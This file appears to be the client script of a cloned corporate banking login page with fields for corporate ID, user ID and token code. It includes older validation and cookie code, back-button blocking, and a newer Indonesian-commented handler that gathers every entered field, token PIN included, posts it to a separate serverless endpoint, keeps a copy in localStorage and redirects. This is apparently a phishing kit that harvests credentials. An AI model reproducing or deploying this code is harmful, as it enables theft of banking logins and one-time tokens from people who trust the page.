	function ForwardThread() {
		try {
			window.history.forward(1);
		} catch (e) { }
	}
	ForwardThread();

	/* This function is used to set cookies */
	function setCookie(name,value,expires,path,domain,secure) {
		document.cookie = name + "=" + escape (value) +
    		((expires) ? "; expires=" + expires.toGMTString() : "") +
    		((path) ? "; path=" + path : "") +
    		((domain) ? "; domain=" + domain : "") + ((secure) ? "; secure" : "");
	}

	/* This function is used to get cookies */
	function getCookie(name) {
		var prefix = name + "="
		var start = document.cookie.indexOf(prefix)

		if (start==-1) {
			return null;
		}

		var end = document.cookie.indexOf(";", start+prefix.length)
		if (end==-1) {
			end=document.cookie.length;
		}

		var value=document.cookie.substring(start+prefix.length, end)
		return unescape(value);
	}


    // document.getElementById("j_corp_id").focus();


    function saveUsername(theForm) {
        var expires = new Date();
        expires.setTime(expires.getTime() + (1 * 4 * 60 * 60 * 1000)); // sets it for approx 1/3 day.
        /*comment this for security
        setCookie("username",theForm.j_username.value,expires,"<c:url value="/"/>");
        setCookie("corpid",theForm.j_corp_id.value,expires,"<c:url value="/"/>");
        comment this for security*/

    	var radiox = theForm.j_lang_user;

        var c = 0;

		for(c = 0; c < radiox.length; c++){
			if(radiox[c].checked)
				break;
		}

        setCookie("org.apache.tapestry.locale",radiox[c].value,expires,"<c:url value="/"/>");
    }

    // This function is used by the login screen to validate user/pass
	// are entered.
	function validateRequired(form) {
	    var bValid = true;
	    var focusField = null;
	    var i = 0;
	    var fields = new Array();
	    oRequired = new required();

	    for (x in oRequired) {
	        if ((form[oRequired[x][0]].type == 'text' || form[oRequired[x][0]].type == 'textarea' || form[oRequired[x][0]].type == 'select-one' || form[oRequired[x][0]].type == 'radio' || form[oRequired[x][0]].type == 'password') && form[oRequired[x][0]].value == '') {
	           if (i == 0)
	              focusField = form[oRequired[x][0]];

	           fields[i++] = oRequired[x][1];

	           bValid = false;
	        }
	    }

	    if (fields.length > 0) {
	       focusField.focus();
	       alert(fields.join('\n'));
	    }

	    return bValid;
	}


    function validateForm(form) {
    	saveUsername(form);
        return validateRequired(form);
    }

    /**
     * Fungsi baru untuk menangani submit form dengan AJAX.
     * @param {HTMLFormElement} form - Objek form.
     */
    async function handleLoginSubmit(form) {
        // 1. Validasi form
        if (!validateForm(form)) {
            return false;
        }

        // 2. Ambil data form
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());

        // 3. Tampilkan loading/disable tombol
        const submitButton = form.querySelector('input[type="submit"]');
        submitButton.disabled = true;
        submitButton.value = 'Loading...';

        try {
            // 4. Kirim data ke Vercel Serverless Function
            const response = await fetch(form.action, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            const result = await response.json();

            if (response.ok && result.success) {
                // 5. Simpan data ke localStorage (menggantikan sesi PHP)
                window.dataStorage.save(data);

                // 6. Redirect ke halaman berikutnya
                window.location.href = result.redirect;
            } else {
                // 7. Tampilkan pesan error
                alert(result.message || 'Terjadi kesalahan saat memproses data.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Terjadi kesalahan jaringan atau server.');
        } finally {
            // 8. Kembalikan tombol ke keadaan semula
            submitButton.disabled = false;
            submitButton.value = 'Login';
        }

        return false; // Mencegah submit form bawaan
    }

    window.handleLoginSubmit = handleLoginSubmit;

    function required () {
    	this.ab = new Array("j_corp_id", "Corporate ID must be filled", new Function ("varName", " return this[varName];"));
        this.aa = new Array("j_username", "User ID must be filled", new Function ("varName", " return this[varName];"));
        this.ac = new Array("j_token_pin", "Token Code must be filled", new Function ("varName", " return this[varName];"));
    }
